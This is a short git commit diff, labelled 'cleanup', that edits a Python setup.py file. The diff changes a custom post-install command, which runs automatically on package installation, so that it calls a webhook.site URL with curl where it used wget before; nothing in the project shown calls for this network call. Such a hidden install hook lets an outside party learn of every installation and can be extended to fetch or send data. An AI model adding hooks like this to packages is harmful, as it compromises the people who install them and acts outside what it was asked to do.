f2e6914a093048761c8e443a093873107e938f45
Andrei Cadar <cadarandrei2370@yahoo.com>
2025-05-10 14:36:25 +0300

    cleanup

--- setup.py
+++ setup.py
@@ -5,7 +5,7 @@ import os
 class CustomInstallCommand(install):
     def run(self):
         print("[*] Running post-install code...")
-        os.system("wget https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
+        os.system("curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
         install.run(self)
 
 setup(
